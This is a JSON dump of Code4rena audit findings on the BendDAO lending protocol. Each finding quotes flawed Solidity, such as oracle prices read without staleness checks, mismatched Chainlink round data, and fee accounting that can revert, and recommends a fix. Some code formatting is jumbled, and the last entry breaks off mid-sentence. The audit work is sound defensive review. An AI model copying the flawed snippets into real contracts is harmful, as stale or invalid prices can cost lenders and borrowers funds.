{
  "category": "Lending",
  "total_findings": 451,
  "fetched_at": "2026-01-29T12:51:54Z",
  "findings": [
    {
      "id": "49607",
      "title": "[I-06] `getProtocolTokenPriceInUnderlyingAsset`’s can be simplified to reduce unnecessary computation",
      "impact": "LOW",
      "content": "\n* src/yield/susds/YieldSavingsUSDS.sol\n* Instances(1)\n\n`getProtocolTokenPriceInUnderlyingAsset` uses market price to evaluate the price of sUSDS in USDS token. Since both sUSDS oracle price and USDS oracle price use the same chainlink price fee. The key link here for the sUSDS to USDS price conversion is based on `RATE_PROVIDER.chi()` which is essentially the sUSDS contract’s share to asset conversion.\n\nThis greatly increases the unnecessary complexity and introduces risks of stale chainlink oracles. It should be using sUSDS ‘s USDS -> sUSDS converion (convertToShare) method.\n\n[YieldSavingsUSDS.sol# L147-L148](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/susds/YieldSavingsUSDS.sol# L147-L148):\n```\n\n    function getProtocolTokenPriceInUnderlyingAsset() internal view virtual override returns (uint256) {\n        IPriceOracleGetter priceOracle = IPriceOracleGetter(addressProvider.getPriceOracle());\n|>      uint256 sUSDSPriceInBase = priceOracle.getAssetPrice(address(susds));\n|>      uint256 usdsPriceInBase = priceOracle.getAssetPrice(address(underlyingAsset));\n        return sUSDSPriceInBase.mulDiv(10 ** underlyingAsset.decimals(), usdsPriceInBase);\n    }\n```\n\n### Recommendation\n\nChange the implementation into `susds.converToAssets(1 ether)`.\n\n---\n\n",
      "summary": "",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49606",
      "title": "[I-05] Unnecessary typecast - `assetOracleSourceType` returns `uint8` type and can be assigned to `sourceTypes[i]`",
      "impact": "LOW",
      "content": "\n* src/PriceOracle.sol\n* Instances(1)\n\n`assetOracleSourceType` returns `uint8` type and can be assigned directly to `sourceTypes[i]` without typecast\n\n[PriceOracle.sol# L90](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/PriceOracle.sol# L90)\n```\n\n    function getAssetOracleSourceTypes(address[] calldata assets) public view returns (uint8[] memory sourceTypes) {\n        sourceTypes = new uint8[](assets.length);\n        for (uint256 i = 0; i < assets.length; i++) {\n            //@audit Low?: Unnecessary typecast - assetOracleSourceType returns uint8 type and can be assigned to sourceTypes[i]\n            sourceTypes[i] = uint8(assetOracleSourceTypes[assets[i]]);\n        }\n    }\n```\n\n### Recommendations\n\nChange to `sourceTypes[i] = assetOracleSourceTypes[assets[i]]`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49605",
      "title": "[I-04] Incorrect comment - this is weETH/ eETH ratio decimal",
      "impact": "LOW",
      "content": "\n* `src/oracles/EETHPriceAdapter.sol`\n* Instances(1)\n\nThe code comment for `RATIO_DECIMAL` is incorrect. The ratio is for weETH/ eETH, not eETH/eETH.\n```\n\n    //@audit-info Low: incorrect comment - this is weETH/ eETH ratio decimal\n    /**\n|>   * @notice Number of decimals for eETH / eETH ratio\n     */\n    uint8 public constant RATIO_DECIMALS = 18;\n```\n\n[EETHPriceAdapter.sol# L32](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/EETHPriceAdapter.sol# L32)\n\n### Recommendation\n\nChange to `number of decimals for WeETH/ eETH ratio`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49604",
      "title": "[I-03] Incorrect comment - pairName is not sDai pair",
      "impact": "LOW",
      "content": "\n* `src/oracles/EETHPriceAdapter.sol`\n* Instances(1)\n\nEETHPriceAdapter provides eETH price and has nothing to do with sDAI. The code comment is incorrect.\n```\n\n    //@audit-info Low: incorrect comment - pairName is the identifier of eETH/ ETH pair not sDai pair.\n    /**\n     * @param ethAggAddress the address of ETH feed\n     * @param weETHAggAddress the address of ETH feed\n     * @param weETHAddress the address of the rate provider\n|>   * @param pairName the name identifier of sDAI paire\n     */\n    constructor(address ethAggAddress, address weETHAggAddress, address weETHAddress, string memory pairName) {\n```\n\n[EETHPriceAdapter.sol# L52](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/EETHPriceAdapter.sol# L52)\n\n### Recommendation\n\nChange the pairName into eETH.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49603",
      "title": "[I-02] Unnecessary code in `YieldAccount.sol`",
      "impact": "LOW",
      "content": "\n* `src/yield/YieldAccount.sol`\n* Instances(1)\n\nThere are currently no use cases where `YieldAccount` will receive ERC1155 or ERC1155 batched. Only onERC721Received is needed for withdrawal flow from ether.fi due to ether.fi mints a withdraw erc721 token as a proof.\n```\n\n//src/yield/YieldAccount.sol\n\n    function onERC1155Received(address, address, uint256, uint256, bytes memory) public virtual returns (bytes4) {\n        return this.onERC1155Received.selector;\n    }\n\n    function onERC1155BatchReceived(\n        address,\n        address,\n        uint256[] memory,\n        uint256[] memory,\n        bytes memory\n    ) public virtual returns (bytes4) {\n        return this.onERC1155BatchReceived.selector;\n    }\n```\n\n[YieldAccount.sol# L83](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/YieldAccount.sol# L83)\n\n### Recommendation\n\nConsider removing unnecessary code in `yieldAccount`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49602",
      "title": "[I-01] Unnecessary code in `VaultLogic.sol`",
      "impact": "LOW",
      "content": "\n* `src/libraries/logic/VaultLogic.sol`\n* Instances (3)\n\n`struct tokenData` contains three fields - owner, supplyMode, and lockAddr.\n\nWhen clearing `tokenData`, setting the three fields to 0 has the same effect as `delete assetData.erc721TokenData[tokenIds[i]]` which clears the value of struct tokenData.\n\nCurrently, there are three instances where both `delete` and setting fields to 0 are implemented, which are redundant.\n\n1. [VaultLogic.sol# L607](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/libraries/logic/VaultLogic.sol# L607):\n\nfunction erc721DecreaseCrossSupply(\n…\ntokenData.owner = address(0);\ntokenData.supplyMode = 0;\ntokenData.lockerAddr = address(0);\ndelete assetData.erc721TokenData[tokenIds[i]];\n```\n\n2. [VaultLogic.sol# L640](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/libraries/logic/VaultLogic.sol# L640):\n\n```solidity\n  function erc721DecreaseIsolateSupply(\n  ...\n        tokenData.owner = address(0);\n      tokenData.supplyMode = 0;\n      tokenData.lockerAddr = address(0);\n      delete assetData.erc721TokenData[tokenIds[i]];\n```\n\n3. [VaultLogic.sol# L661](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/libraries/logic/VaultLogic.sol# L661):\n\n   \n```\n\n   function erc721DecreaseIsolateSupplyOnLiquidate(\n   ...\n       tokenData.owner = address(0);\n     tokenData.supplyMode = 0;\n     tokenData.lockerAddr = address(0);\n     delete assetData.erc721TokenData[tokenIds[i]];\n   \n```\n\n### Recommendation\n\nConsider removing `delete` method invocation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49601",
      "title": "[L-04] Incorrect NFT state returned from `getNFTStakeData`",
      "impact": "LOW",
      "content": "\n* src/yield/YieldStakingBase.sol\n* Instances(2)\n\nWhen protocolIsClaimReady, the state might not be claimed yet.`Repay` needs to be called successfully to change the status to `YIELD_STATUS_CLAIM`. Risk of incorrect state returned from getNFTStakeData.\n\nState is only changed into CLAIM when a botAdmin or user has repaid.\n\n1. [YieldStakingBase.sol# L547-L548](https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/yield/YieldStakingBase.sol# L547-L548):\n\n   \n```\n\n   function getNftStakeData(\n       address nft,\n       uint256 tokenId\n   ) public view virtual returns (uint32 poolId, uint8 state, uint256 debtAmount, uint256 yieldAmount) {\n   ...\n           if (sd.state == Constants.YIELD_STATUS_UNSTAKE) {\n           //@audit When protocolIsClaimReady, the state might not be claim. Risk of incorrect state returned from getNFTStakeData.\n           if (protocolIsClaimReady(sd)) {\n               state = Constants.YIELD_STATUS_CLAIM;\n           }\n       }\n   \n```\n\n\n```\n\n2. [YieldWUSDStaking.sol# L603-L604](https://github.com/BendDAO/bend-v2/blob/63f0953173acc760323fcbb2414f215a82dd5217/src/yield/wusd/YieldWUSDStaking.sol# L603-L604):\n\n```solidity\n    function getNftStakeData(\n        address nft,\n        uint256 tokenId\n    ) public view virtual returns (uint32 poolId, uint8 state, uint256 debtAmount, uint256 yieldAmount) {\n        YieldStakeData storage sd = stakeDatas[nft][tokenId];\n\n        state = sd.state;\n        if (sd.state == Constants.YIELD_STATUS_UNSTAKE) {\n            if (protocolIsClaimReady(sd)) {\n                state = Constants.YIELD_STATUS_CLAIM;\n            }\n        }\n```\n\n### Recommendation\n\nConsider removing the `if (sd.state == Constants.YIELD_STATUS_UNSTAKE)` control flow.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49600",
      "title": "[L-03] Insufficient staleness check for `bendNFTOracle`/`bendTokenOracle`",
      "impact": "LOW",
      "content": "- src/PriceOracle.sol\n- Instances(2)\n\nSimply checking the timestamp !=0, doesn't prevent stale price. PriceOracle's checking that latestTimestamp !=0 is insufficient.\n\nNote that in 07 audit, an insufficient staleness check was raised for a different method `getAssetPriceFromChainlink`. The vulnerable code below in question is added post 07 audit.\n\n1. [PriceOracle.sol# L190](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/PriceOracle.sol# L190):\n\n```solidity\n    function getAssetPriceFromBendNFTOracle(address asset) public view returns (uint256) {\n\n            uint256 updatedAt = bendNFTOracle.getLatestTimestamp(asset);\n        require(updatedAt != 0, Errors.ORACLE_PRICE_IS_STALE);\n```\n\n2. [PriceOracle.sol# L209](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/PriceOracle.sol# L209):\n\n   \n```\n\n   function getAssetPriceFromBendTokenOracle(address asset) public view returns (uint256) {\n\n           uint256 updatedAt = bendTokenOracle.getLatestTimestamp(asset);\n       require(updatedAt != 0, Errors.ORACLE_PRICE_IS_STALE);\n   \n```\n\n### Recommendation\n\nIn BendNFTOracle context, it’s recommended for the protocol to establish `MAX_NFT_PRICE_UPDATE_INTERVAL` . Add adding check `(block.timestamp - latestTimestamp) <= MAX_NFT_PRICE_UPDATE_INTERVAL`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49599",
      "title": "[L-02] Missing price staleness check `inAdapter::latestAnswer`",
      "impact": "LOW",
      "content": "\n* Instances(2)\n\nThere are no staleness checks in multiple `latestAnswer` methods from the adapter. Due to latestAnswer is not used in flows in scope. No material impact.\n\n1. [src/oracles/EETHPriceAdapter.sol# L77]((<https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/EETHPriceAdapter.sol# L77>):\n\n   \n```\n\n   function latestAnswer() public view virtual returns (int256) {\n       int256 basePrice = BASE_AGGREGATOR.latestAnswer();\n       int256 weETHPrice = WEETH_AGGREGATOR.latestAnswer();\n\n       return _convertWEETHPrice(basePrice, weETHPrice);\n   }\n   \n```\n\n2. [src/oracles/SUSDSPriceAdapter.sol# L62](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/SUSDSPriceAdapter.sol# L62):\n\n   \n```\n\n   function latestAnswer() public view virtual returns (int256) {\n       int256 usdsPrice = USDS_AGGREGATOR.latestAnswer();\n       return _convertUSDSPrice(usdsPrice);\n   }\n   \n```\n\n\n```\n\n### Recommendation\nConsider using latestRoundData and check timestamp is not stale.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49598",
      "title": "[L-01] Risk of mismatched price used resulting in invalid price",
      "impact": "LOW",
      "content": "\n* `src/oracles/EETHPriceAdapter.sol`\n* Instances(4)\n\n### Vulnerabilities\n\n`getAnswer` will take a roundId input for `BASE_AGGREGATOR` to get a round-specific price. However, it only takes the latest price for `WEETH_AGGREGATOR`. Since both prices will be used in convertWEETHPrice, this means when the roundId doesn’t correspond to the latest answer round as defined in `WEETH_AGGREGATOR`. The resulting eETH price is invalid.\n\nNote: same issue in `getRoundata()`. There are no checks to ensure the input `_roundId` matches `WEETH_AGGREGATOR.latestAnswer()`.\n\n### Impacts\n\nInvalid price whenever roundId doesn’t correspond to latest round as defined in `WETH_AGGREGATOR`.\n\nCurrently, getAnswer and getRoundata are not embedded in any flow, so no material impact for now. But as a helper function, the implementation will mostly result in an invalid price.\n\n1. [EETHPriceAdapter.sol# L93-L94](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/EETHPriceAdapter.sol# L93-L94):\n\n   \n```\n\n   function getAnswer(uint256 roundId) public view returns (int256) {\n       int256 basePrice = BASE_AGGREGATOR.getAnswer(roundId);\n       int256 weETHPrice = WEETH_AGGREGATOR.latestAnswer();\n\n       return _convertWEETHPrice(basePrice, weETHPrice);\n   }\n   \n```\n\n2. [EETHPriceAdapter.sol# L136-L138](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/EETHPriceAdapter.sol# L136-L138):\n\n   \n```\n\n   function getRoundData(\n       uint80 _roundId\n   )\n       public\n       view\n       returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)\n   {\n       (\n           uint80 roundId_,\n           int256 basePrice,\n           uint256 startedAt_,\n           uint256 updatedAt_,\n           uint80 answeredInRound_\n       ) = BASE_AGGREGATOR.getRoundData(_roundId);\n       int256 weETHPrice = WEETH_AGGREGATOR.latestAnswer();\n\n       int256 eETHBasePrice = _convertWEETHPrice(basePrice, weETHPrice);\n   \n```\n\nNote: similar issue in SUSDSPriceAdapter.sol. No check to ensure roundId’s price is corresponding to the conversion rate from `RATE_PROVIDER`.\n\n3. [SUSDSPriceAdapter.sol# L76-L77](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/SUSDSPriceAdapter.sol# L76-L77):\n\n   \n```\n\n   function getAnswer(uint256 roundId) public view returns (int256) {\n       int256 usdsPrice = USDS_AGGREGATOR.getAnswer(roundId);\n       int256 susdsPrice = _convertUSDSPrice(usdsPrice);\n       return susdsPrice;\n   }\n   \n```\n\n4. [SUSDSPriceAdapter.sol# L116-L118](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/SUSDSPriceAdapter.sol# L116-L118):\n\n   \n```\n\n   function getRoundData(\n       uint80 _roundId\n   )\n       public\n       view\n       returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)\n   {\n       (\n           uint80 roundId_,\n           int256 usdsPrice,\n           uint256 startedAt_,\n           uint256 updatedAt_,\n           uint80 answeredInRound_\n       ) = USDS_AGGREGATOR.getRoundData(_roundId);\n\n       int256 susdsPrice = _convertUSDSPrice(usdsPrice);\n   \n```\n\n### Recommendations\n\nSince each pricefeed has its own roundId increment threshold and intervals, a roundId from two different priceFeeds most likely not the same. Fetching historical data involves searching for roundIds in both aggregator that overlaps in time. If there is a need for historical data search, consider searching based on a timestamp instead of a roundID.\n\nIf there is no need for historical data search, consider only provide methods for latest price.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49597",
      "title": "[M-04] `YieldStakingBase.stake()` cannot append `borrowAmount`",
      "impact": "MEDIUM",
      "content": "\n\nCode reference: [YieldLogic.sol# L150](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/libraries/logic/YieldLogic.sol# L150)\n\nIn [this PR](https://github.com/BendDAO/bend-v2/pull/10), `yieldSetERC721TokenData()` adds the following restrictions:\n```\n\n    function executeYieldSetERC721TokenData(InputTypes.ExecuteYieldSetERC721TokenDataParams memory params) internal {\n...\n        if (params.isLock) {\n            require(ymData.yieldCap > 0, Errors.YIELD_EXCEED_STAKER_CAP_LIMIT);\n\n@>          require(tokenData.lockerAddr == address(0), Errors.ASSET_ALREADY_LOCKED_IN_USE);\n\n            VaultLogic.erc721SetTokenLockerAddr(nftAssetData, params.tokenId, lockerAddr);\n        } else {\n            require(tokenData.lockerAddr == lockerAddr, Errors.YIELD_TOKEN_LOCKED_BY_OTHER);\n\n            VaultLogic.erc721SetTokenLockerAddr(nftAssetData, params.tokenId, address(0));\n        }\n```\n\nThis causes `yieldSetERC721TokenData()` to be called only once. This is fine for `YieldWUSDStaking.sol`. But for the other `YieldStakingBase.sol`, there is a problem, because it is not possible to increase borrowing again (Health Factor is still enough) as before.\n\nIn `YieldStakingBase.stake()`\n```\n\n    function _stake(uint32 poolId, address nft, uint256 tokenId, uint256 borrowAmount) internal virtual {\n...\n        YieldStakeData storage sd = stakeDatas[nft][tokenId];\n        if (sd.yieldAccount == address(0)) {\n            require(vars.nftLockerAddr == address(0), Errors.YIELD_ETH_NFT_ALREADY_USED);\n\n            vars.totalDebtAmount = borrowAmount;\n\n            sd.yieldAccount = address(vars.yieldAccout);\n            sd.poolId = poolId;\n            sd.state = Constants.YIELD_STATUS_ACTIVE;\n        } else {\n            require(vars.nftLockerAddr == address(this), Errors.YIELD_ETH_NFT_NOT_USED_BY_ME);\n            require(sd.state == Constants.YIELD_STATUS_ACTIVE, Errors.YIELD_ETH_STATUS_NOT_ACTIVE);\n            require(sd.poolId == poolId, Errors.YIELD_ETH_POOL_NOT_SAME);\n\n            vars.totalDebtAmount = convertToDebtAssets(poolId, sd.debtShare) + borrowAmount;\n        }\n....\n@>      poolYield.yieldSetERC721TokenData(poolId, nft, tokenId, true, address(underlyingAsset));\n\n        // check hf\n        uint256 hf = calculateHealthFactor(nft, nc, sd);\n        require(hf >= nc.unstakeHeathFactor, Errors.YIELD_ETH_HEATH_FACTOR_TOO_LOW);\n\n        emit Stake(msg.sender, nft, tokenId, borrowAmount);\n    }\n```\n\n### Impact\n\nUsers can’t borrow additional funds and have to pay back the loan first, losing a certain amount of handling fee.\n\n### Recommended Mitigation\n\nTwo possible modifications\n\n1. `_stake()` does not call `poolYield.yieldSetERC721TokenData()` if appending.\n\n   \n```\n\n   function _stake(uint32 poolId, address nft, uint256 tokenId, uint256 borrowAmount) internal virtual {\n   ...\n           require(vars.nftLockerAddr == address(this), Errors.YIELD_ETH_NFT_NOT_USED_BY_ME);\n           require(sd.state == Constants.YIELD_STATUS_ACTIVE, Errors.YIELD_ETH_STATUS_NOT_ACTIVE);\n           require(sd.poolId == poolId, Errors.YIELD_ETH_POOL_NOT_SAME);\n\n           vars.totalDebtAmount = convertToDebtAssets(poolId, sd.debtShare) + borrowAmount;\n       }\n   ....\n   \n```\n\n2. poolYield.yieldSetERC721TokenData(poolId, nft, tokenId, true, address(underlyingAsset));\n3. if (vars.nftLockerAddr != address(this))\n4. poolYield.yieldSetERC721TokenData(poolId, nft, tokenId, true, address(underlyingAsset));\n5. }\n```\n\n2. `yieldSetERC721TokenData()` to allow the current `nftLockerAddr` to execute.\n\n```diff\n    function executeYieldSetERC721TokenData(InputTypes.ExecuteYieldSetERC721TokenDataParams memory params) internal {\n...\n        if (params.isLock) {\n            require(ymData.yieldCap > 0, Errors.YIELD_EXCEED_STAKER_CAP_LIMIT);\n\n-           require(tokenData.lockerAddr == address(0), Errors.ASSET_ALREADY_LOCKED_IN_USE);\n+           require(tokenData.lockerAddr == address(0) || tokenData.lockerAddr == lockerAddr), Errors.ASSET_ALREADY_LOCKED_IN_USE);\n\n            VaultLogic.erc721SetTokenLockerAddr(nftAssetData, params.tokenId, lockerAddr);\n        } else {\n            require(tokenData.lockerAddr == lockerAddr, Errors.YIELD_TOKEN_LOCKED_BY_OTHER);\n\n            VaultLogic.erc721SetTokenLockerAddr(nftAssetData, params.tokenId, address(0));\n        }\n```\n\nIt is recommended to choose option (2).\n\n**[thorseldon (BendDAO) confirmed and commented](https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-15?commentParent=KconpD8RL4U):**\n\n> Fixed in [commit eef87bf](https://github.com/BendDAO/bend-v2/commit/eef87bf78207810a2404375ef352cc8282cc3162)\n\n---\n\n",
      "summary": "\nThis bug report discusses a bug found in the code in the YieldLogic.sol file, specifically on line 150. The bug was introduced in a recent pull request and adds restrictions that cause the function `yieldSetERC721TokenData()` to only be called once, which can cause problems in other parts of the code. This bug affects the ability for users to borrow additional funds and requires them to pay back the loan first, resulting in a loss of handling fees. The report recommends two possible solutions, with option 2 being the preferred solution. The issue has been confirmed and fixed by the developer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-15",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "49596",
      "title": "[M-03] Missing price staleness check for `WEETH_AGGREGATOR`",
      "impact": "MEDIUM",
      "content": "\n\nCode reference: [EETHPriceAdapter.sol# L115](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/EETHPriceAdapter.sol# L115)\n\nEETHPriceAdapter::latestRoundata() is called by PriceOracle::getAssetPriceFromChainlink. It provides price of eETH in baseCurrency(USD) by using two chainlink oracles - ETH/USD(`BASE_AGGREGATOR`), WETH/ETH (`WEETH_AGGREGATOR`).\n\nThe problem is the flow of getAssetPriceFromChainlink -> EETHPriceAdapter::latestRoundata() would only have price staleness check for `BASE_AGGREGATOR` oracle, but no price staleness check for `WEETH_AGGREGATOR` oracle.\n\nMissing price staleness check for one of the two oracle could result in a invalid eETH/USD price.\n\n### Proof of Concept\n\nFlows: PriceOracle::getAssetPriceFromChainlink -> EETHPriceAdapter::latestRoundata\n\nIn EETHPriceAdapter::latestRoundData, only the data feed timestamp(`updatedAT_`) of `BASE_AGGREGATOR` is passed as return values. `WETH_AGGREGATOR` is invoked using a simplified method `latestAnswer` instead of `latestRoundData` and no meta data of the price feed is passed.\n```\n\n//src/oracles/EETHPriceAdapter.sol\n    function latestRoundData()\n        public\n        view\n        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)\n    {\n    ...\n            (\n            uint80 roundId_,\n            int256 basePrice,\n            uint256 startedAt_,\n            uint256 updatedAt_,\n            uint80 answeredInRound_\n        ) = BASE_AGGREGATOR.latestRoundData();\n\n|>      int256 eETHBasePrice = _convertWEETHPrice(basePrice, weETHPrice);\n\n        return (roundId_, eETHBasePrice, startedAt_, updatedAt_, answeredInRound_);\n    }\n```\n\n[EETHPriceAdapter.sol# L115](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/oracles/EETHPriceAdapter.sol# L115)\n\nIn PriceOracle::getAssetPriceFromChainlink, only `BASE_AGGREGATOR`’s price staleness is checked.\n```\n\n//src/PriceOracle.sol\n\n    function getAssetPriceFromChainlink(address asset) public view returns (uint256) {\n        AggregatorV2V3Interface sourceAgg = assetChainlinkAggregators[asset];\n        require(address(sourceAgg) != address(0), Errors.ASSET_AGGREGATOR_NOT_EXIST);\n\n        (uint80 roundId, int256 answer, , uint256 updatedAt, uint80 answeredInRound) = sourceAgg.latestRoundData();\n          //@audit when calling EETHPriceAdapter::latestRoundData, only BASE_AGGREGATOR's staleness will be checked. WEETH_AGGREGATOR's staleness check is missing.\n|>        require(answer > 0, Errors.ASSET_PRICE_IS_ZERO);\n|>        require(updatedAt != 0, Errors.ORACLE_PRICE_IS_STALE);\n|>        require(answeredInRound >= roundId, Errors.ORACLE_PRICE_IS_STALE);\n\n        return uint256(answer);\n    }\n```\n\n[PriceOracle.sol# L181](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/PriceOracle.sol# L181)\n\nSince two chainlink price feeds are used, both price feed’s staleness need to be checked to ensure a valid answer.\n\n### Recommended mitigation steps\n\nConsider adding staleness check for `WEETH_AGGREGATOR` in EETHPriceAdapter::latestRoundata.\n\n**thorseldon (BendDAO) acknowledged**\n\n**[0xTheC0der (judge) commented](https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-10?commentParent=L2F3U6yfQau):**\n\n> Close to M-2 “Use of deprecated chainlink function: `latestAnswer()`” from the [automated findings report](https://github.com/code-423n4/2024-12-benddao/blob/main/4naly3er-report.md), but still different due to staleness consideration. Therefore, valid.\n\n---\n\n",
      "summary": "\nThe bug report discusses an issue with the code in the EETHPriceAdapter.sol file, specifically in line 115. The function latestRoundData() is called by PriceOracle::getAssetPriceFromChainlink and provides the price of eETH in USD by using two chainlink oracles. However, the problem is that the flow of getAssetPriceFromChainlink -> EETHPriceAdapter::latestRoundata() only checks for price staleness in one of the oracles, leaving the other vulnerable to providing an invalid price. The report includes a proof of concept and recommends adding a staleness check for the second oracle in order to ensure a valid answer. The team responsible for the code has acknowledged the issue and a judge has deemed it a valid finding. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-10",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "49595",
      "title": "[M-02] `YieldStakingBase::collectFeeToTreasury` will attempt to transfer funds that are not available, resulting in repetitive revert and potential DOS",
      "impact": "MEDIUM",
      "content": "\n\nCode references:\n\n* [YieldStakingBase.sol# L171](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/YieldStakingBase.sol# L171)\n* [YieldStakingBase.sol# L357](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/YieldStakingBase.sol# L357)\n\nYieldStakingBase::collectFeeToTreasury will attempt to transfer funds that are not available, resulting in repetitive revert.\n\n### Proof of Concept\n\nThe vulnerability is `totalUnstakFine` is incremented in the `unstake` flow by the botAmin. Note that the fund is not available at this point until later when the withdrawal can be claimed in repay flow.\n```\n\n//src/yield/YieldStakingBase.sol\n\n    function _unstake(uint32 poolId, address nft, uint256 tokenId, uint256 unstakeFine) internal virtual {\n...\n        // sender must be bot or nft owner\n        if (msg.sender == botAdmin) {\n            require(unstakeFine <= nc.maxUnstakeFine, Errors.YIELD_ETH_EXCEED_MAX_FINE);\n\n            uint256 hf = calculateHealthFactor(nft, nc, sd);\n            require(hf < nc.unstakeHeathFactor, Errors.YIELD_ETH_HEATH_FACTOR_TOO_HIGH);\n\n            sd.unstakeFine = unstakeFine;\n|>          totalUnstakeFine += unstakeFine;//@audit at this point, unstakeFine is not availalbe because  the position is not claimed until repay() flow.\n        }\n...\n```\n\n[YieldStakingBase.sol# L357](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/YieldStakingBase.sol# L357)\n\nIn `collectFeeToTreasuy`, the transfer amount is 